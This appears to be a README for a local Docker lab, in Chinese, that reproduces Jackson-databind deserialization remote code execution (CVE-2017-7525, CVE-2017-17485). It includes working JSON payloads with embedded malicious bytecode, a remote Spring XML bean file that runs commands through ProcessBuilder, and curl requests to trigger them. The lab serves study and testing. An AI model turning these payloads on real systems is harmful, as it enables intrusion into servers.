# 简介

Jackson-databind 支持 [Polymorphic Deserialization](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization) 特性（默认情况下不开启），当 json 字符串转换的 Target class 中有 polymorph fields，即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 `TemplatesImpl`，可以实现任意代码执行。

**利用前提：**

- 开启 JacksonPolymorphicDeserialization，即调用以下任意方法

  ```java
  objectMapper.enableDefaultTyping(); // default to using DefaultTyping.OBJECT_AND_NON_CONCRETE
  objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
  ```

- Target class 需要有无参 constructor

- Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 / 实现接口

# 运行 & 测试


运行

```shell
cd jackson
docker-compose up -d
```

测试接口为  `127.0.0.1:8080/exploit`

停止 & 移除

```shell
docker-compose stop
docker-compose rm -f
```

## CVE-2017-7525

使用 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 作为 Gadget

payload 如下，Target class 有一个 param 变量，类型为 Object，可以通过数组值中首个元素来指定变量类型。以下请求后会执行 `touch /tmp/prove1.txt` 

```json
{
  "param": [
    "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    {
      "transletBytecodes": [
  "yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw=="
      ],
      "transletName": "a.b",
      "outputProperties": {}
    }
  ]
}
```

将以上保存为 data.txt，然后请求

```shell
curl -XPOST -H "Content-Type:application/json" -d@data.txt 127.0.0.1:8080/exploit
```

验证，若文件存在则说明执行成功

```shell
docker-compose exec web ls -lh /tmp/prove1.txt 
```



**原理：**`Jackson-databind` 在设置 Target class 成员变量参数值时，若没有对应的 getter 方法，则会使用 `SetterlessProperty` 调用 getter 方法，获取变量，然后设置变量值。当调用 `getOutputProperties()` 方法时，会初始化 `transletBytecodes` 包含字节码的类，导致命令执行，具体可参考 [java-deserialization-jdk7u21-gadget-note](https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/) 中关于 `TemplatesImpl` 的说明

经测试，在 jdk 7u21 下成功，高版本的 jdk，如 jdk 7u79、 jdk 8 均会失败



## CVE-2017-17485

CVE-2017-7525 [黑名单修复](https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1) 绕过，利用了 `org.springframework.context.support.FileSystemXmlApplicationContext` 

payload 如下，为了方便测试，定义 bean 的 xml 文件放在 `http://127.0.0.1:8080/spel.xml`。请求后会执行 `touch /tmp/prove2.txt`


```json
{
  "param": [
    "org.springframework.context.support.FileSystemXmlApplicationContext",
    "http://127.0.0.1:8080/spel.xml"
  ]
}
```

spel.xml 文件内容为 

```xml
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd
">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
            <array>
                <value>touch</value>
                <value>/tmp/prove2.txt</value>
            </array>
        </constructor-arg>
        <property name="any" value="#{ pb.start() }"/>
    </bean>
</beans>
```



将 payload 内容保存为 data1.txt，然后执行

```shell
curl -XPOST -H "Content-Type:application/json" -d@data1.txt 127.0.0.1:8080/exploit
```

验证

```shell
docker-compose exec web ls -lh /tmp/prove2.txt 
```

文件存在则说明执行成功

**原理：**利用 `FileSystemXmlApplicationContext` 加载远程 bean 定义文件，创建 ProcessBuilder bean，并在 xml 文件中使用 Spring EL 来调用 `start()` 方法实现命令执行

# 代码结构

- `src/main/java` 为 web 代码目录，使用了 Spring Boot，代码比较简单，可自行阅读
- `src/main/resources/` 包含配置文件 和 payload 文件

- `src/test/java/com/b1ngz/sec/JacksonTest.java`  包含 payload 的 Unit Test
  - `test_generate_TemplatesImpl_transletBytecodes()`  用于生成 `TemplatesImpl` 恶意字节码，运行后会打印  `transletBytecodes`，可以修改 `command` 为要执行的命令
  - `test_payload_TemplatesImpl()` 本地测试使用 `TemplatesImpl`，payload 在 `src/main/resources/payload_TemplatesImpl.json`
  - `test_payload_FileSystemXmlApplicationContext()`  本地测试使用  Spring  `FileSystemXmlApplicationContext`，payload 在`src/main/resources/spel.xml`

# 本地构建

```shell
cd jackson
# build from source code
mvn -U clean package -Dmaven.test.skip=true
# build docker image
docker build -t vulhub/jackson:latest .
# start
docker-compose up -d
```

# 参考

- [JacksonPolymorphicDeserialization](https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization)
- [Exploiting the Jackson RCE: CVE-2017-7525](https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/)
- [jackson-rce-via-spel](https://github.com/irsl/jackson-rce-via-spel)
- [Jackson Deserializer security vulnerability](https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1)